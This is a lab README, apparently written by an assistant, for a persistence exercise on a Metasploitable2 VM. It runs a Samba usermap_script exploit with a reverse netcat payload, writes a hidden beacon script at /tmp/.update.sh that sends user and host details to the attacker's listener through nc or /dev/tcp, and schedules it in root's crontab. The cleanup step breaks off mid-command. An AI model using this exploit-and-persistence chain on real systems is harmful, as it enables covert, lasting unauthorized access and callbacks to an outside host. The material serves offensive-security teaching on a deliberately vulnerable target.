Here’s the lab content turned into a `README.md` file for your cron-based persistence exercise:


# Lab: Persistence Implementation on Metasploitable2 - Cron-Based Beacon

## Overview

In this lab, you will establish persistence on a Metasploitable2 target machine by creating a benign cron-based beacon. This persistence method will survive reboots and help maintain long-term control. The beacon will log activity locally and optionally send messages to a listener on your Kali VM.

> **Safety Note:** The beacon script is harmless — it only writes timestamped log entries and optionally sends a short text line to a listener. It does **not** create reverse shells or interactive backdoors.

## Learning Objectives

After completing this lab, you will be able to:

- Transfer a script from Kali to Metasploitable2
- Create a cron-based beacon on the compromised host
- Validate persistence with logs and a listener
- Explain where defenders look for cron-based persistence

## Prerequisites

- Kali VM with access to Metasploitable2.
- Interactive shell access to Metasploitable2 (e.g., via Meterpreter or reverse shell).
- Basic knowledge of Linux commands and cron jobs.

> **Note**: This lab assumes you have already exploited Metasploitable2 and obtained a shell.

---

## Terminal Usage Guide

This lab uses four separate terminal windows:

- **Terminal A – Victim Terminal (Metasploitable2):**
  - Run commands on the target VM (Metasploitable2), such as creating the beacon script, setting up the crontab, and inspecting logs.
  
- **Terminal B – Exploit/Metasploit Terminal (Kali):**
  - Run msfconsole and launch the exploit to obtain a shell on the target. Capture and manage sessions here.

- **Terminal C – Listener/Validation Terminal (Kali):**
  - Run the optional netcat listener to receive beacon callbacks and verify persistence.

- **Terminal D – File Transfer & Editor Terminal (Kali):**
  - Create and edit the beacon script locally on Kali. Transfer the file to Metasploitable2 using `scp` or `rsync`.

---

## Exercise 0: Confirm You Are on the Target

1. **On Kali (Terminal B)**, run the exploit to obtain a shell on Metasploitable2:
   ```bash
   msfconsole -q
   use exploit/multi/samba/usermap_script
   set RHOSTS <MSF2_IP>
   set RPORT 139
   set PAYLOAD cmd/unix/reverse_netcat
   set LHOST <KALI_IP>
   set LPORT 5553
   run


2. **On Metasploitable2 (Terminal A)**, verify your identity:

   ```bash
   whoami
   id
   pwd
   ```

---

## Exercise 1: Prepare a Listener on Kali

1. **On Kali (Terminal C)**, start a netcat listener to receive beacon callbacks:

   ```bash
   nc -lvnp 5555
   ```

   You should see:

   ```bash
   listening on [any] 5555 ...
   ```

---

## Exercise 2: Create the Beacon Script on Metasploitable2

1. **On Metasploitable2 (Terminal A)**, create the beacon script `/tmp/.update.sh`:

   ```bash
   cat << 'EOF' > /tmp/.update.sh
   #!/usr/bin/env bash
   # Benign cron beacon: logs a timestamp and optionally notifies a remote listener
   #
   # NOTE: replace <KALI_IP> and <KALI_PORT> below (no angle brackets).
   PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
   LOG_DIR="/tmp/poc_logs"
   LOG_FILE="$LOG_DIR/persist.log"
   LISTENER_HOST="<KALI_IP>"
   LISTENER_PORT="<KALI_PORT>"
   # Ensure basics
   mkdir -p "$LOG_DIR"
   touch "$LOG_FILE"
   chmod 600 "$LOG_FILE"
   # meta
   TS="$(/bin/date +%F_%T 2>/dev/null || date +%F_%T)"
   USER_NAME="$(/usr/bin/whoami 2>/dev/null || echo unknown)"
   HOST_NAME="$(/bin/hostname 2>/dev/null || echo host)"
   PID="$$"
   BEACON="[BEACON] ts=$TS user=$USER_NAME host=$HOST_NAME pid=$PID src=/tmp/.update.sh"
   # keep log size modest (rotate simple: keep last 200 lines)
   if [ -f "$LOG_FILE" ]; then
     /usr/bin/tail -n 200 "$LOG_FILE" > "${LOG_FILE}.tmp" 2>/dev/null || true
     /bin/mv -f "${LOG_FILE}.tmp" "$LOG_FILE" 2>/dev/null || true
   fi
   # append beacon to local log
   echo "$BEACON" >> "$LOG_FILE"
   # small function to attempt a short TCP send (non-blocking, silent)
   _send_beacon_once() {
     local host="$1" port="$2" msg="$3"
     # prefer nc if available
     if command -v /bin/nc >/dev/null 2>&1 || command -v /usr/bin/nc >/dev/null 2>&1; then
       NC="$(command -v /bin/nc 2>/dev/null || command -v /usr/bin/nc 2>/dev/null || command -v nc 2>/dev/null)"
       "$NC" -w 3 "$host" "$port" <<<"$msg" >> "$LOG_FILE" 2>&1 && return 0 || return 1
     fi
     # fallback to bash /dev/tcp
     if bash -c "exec 3<>/dev/tcp/${host}/${port}" >/dev/null 2>&1; then
       printf '%s\n' "$msg" >&3 2>/dev/null || true
       exec 3>&- || true
       return 0
     fi
     return 1
   }
   # If listener configured, try a few quick attempts (do not block indefinitely)
   if [ -n "$LISTENER_HOST" ] && [ -n "$LISTENER_PORT" ]; then
     tries=3
     attempt=1
     while [ $attempt -le $tries ]; do
       echo "[CONNECT_ATTEMPT] attempt=$attempt ts=$(/bin/date +%F_%T) host=${LISTENER_HOST} port=${LISTENER_PORT}" >> "$LOG_FILE"
       if _send_beacon_once "$LISTENER_HOST" "$LISTENER_PORT" "$BEACON"; then
         echo "[CONNECT_OK] ts=$(/bin/date +%F_%T) host=${LISTENER_HOST} port=${LISTENER_PORT}" >> "$LOG_FILE"
         break
       else
         echo "[CONNECT_FAIL] attempt=$attempt ts=$(/bin/date +%F_%T)" >> "$LOG_FILE"
       fi
       sleep $((2 * attempt))   # small backoff
       attempt=$((attempt + 1))
     done
     if [ $attempt -gt $tries ]; then
       echo "[CONNECT_GIVEUP] ts=$(/bin/date +%F_%T) tries=${tries}" >> "$LOG_FILE"
     fi
   else
     echo "[NO_LISTENER_CFG] ts=$(/bin/date +%F_%T) skip remote send" >> "$LOG_FILE"
   fi
   exit 0
   EOF
   ```

2. **Update the listener details**, make the script executable, and verify:

   ```bash
   sudo sed -i 's/<KALI_IP>/YOUR.KALI.IP.HERE/' /tmp/.update.sh
   sudo sed -i 's/<KALI_PORT>/5555/' /tmp/.update.sh
   sudo chmod +x /tmp/.update.sh
   ls -l /tmp/.update.sh
   head -n 20 /tmp/.update.sh
   ```

---

## Exercise 3: Schedule the Cron Job on Metasploitable2

1. **Edit the crontab** to schedule the beacon every 5 minutes:

   ```bash
   export TERM=xterm
   sudo crontab -e
   ```

2. **Add the following line** to the crontab:

   ```
   */5 * * * * /tmp/.update.sh >/dev/null 2>&1
   ```

3. **Save and exit**. Verify the crontab:

   ```bash
   crontab -l
   ```

4. **Test the script manually** to confirm it works before waiting for cron:

   ```bash
   /tmp/.update.sh
   tail -n 10 /tmp/poc_logs/persist.log
   ```

---

## Exercise 4: Validate the Beacon

1. Wait 5–6 minutes, then check the log on Metasploitable2:

   ```bash
   tail -n 20 /tmp/poc_logs/persist.log
   ```

2. **On Kali (Terminal C)**, check if the listener has received beacon messages. You should see something like:

   ```
   [BEACON] ts=2025-08-29_10:35:00 user=msfadmin host=metasploitable pid=12345 src=/tmp/.update.sh
   ```

---

## Exercise 5: Cleanup (Recommended)

1. **Remove the cron job and cleanup**:

   ```bash
   crontab -l | sed '/\/tmp\/
   ```
